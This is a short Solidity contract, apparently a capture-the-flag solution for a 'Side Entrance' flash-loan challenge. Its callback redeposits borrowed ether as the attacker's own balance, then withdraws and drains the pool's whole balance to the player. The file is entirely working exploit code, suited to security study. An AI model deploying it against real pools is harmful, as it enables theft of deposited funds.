// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Pool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceHack {

    address private playerAddress;
    Pool private pool;

    constructor(address player, address poolAddress) {
        playerAddress = player;
        pool = Pool(poolAddress);
    }

    function attack() external payable {
        require(msg.value != 0, "You need to send at least some ether");
        require(msg.sender == playerAddress, "You're not authorized");
        pool.flashLoan(address(pool).balance);
        withdraw();
    }

    function execute() external payable {
        require(address(pool) == msg.sender, "You're not authorized");
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() internal {
        // Withdraw the funds from the pool to the player's address
        pool.withdraw();
        (bool success,  ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }

    receive() external payable {}

}